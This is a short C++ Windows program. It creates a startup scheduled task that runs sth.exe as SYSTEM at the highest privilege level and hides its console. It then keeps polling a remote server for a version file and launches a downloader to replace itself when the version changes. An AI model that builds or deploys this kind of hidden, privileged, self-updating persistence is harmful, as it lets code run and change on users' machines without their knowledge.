#include <bits/stdc++.h>
#include <windows.h>
#include <dir.h>
#include <conio.h>
#include <sys/stat.h>
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")
using namespace std;
inline bool exists (const string name)
{
	struct stat buffer;
	return (stat (name.c_str(), &buffer) == 0); 
}
WINBOOL HideConsole()
{
	HWND hwndc=GetConsoleWindow();
	return ShowWindow(hwndc,SW_HIDE);
}
int main()
{
	system("schtasks /create /sc ONSTARt /tn \"sth\" /tr C:\\Users\\dell\\AppData\\Roaming\\sth.exe /ru SYSTEM /RL HIGHEST /f");
	//system("wmic process where \"name='sth.exe'\" call setpriority 128");
	HideConsole();
	while(1)
	{
		system("curl -O https://raw.iqiq.io/poss-ible/sth/main/vs.txt");
		ifstream vs("vs.txt");
		string vsw;
		vs>>vsw;
		if(vsw!="1.0.0")
		{
			system("start dl.exe sth.exe");
			return 0;
		}
		sleep(300);
	}
	return 0;
}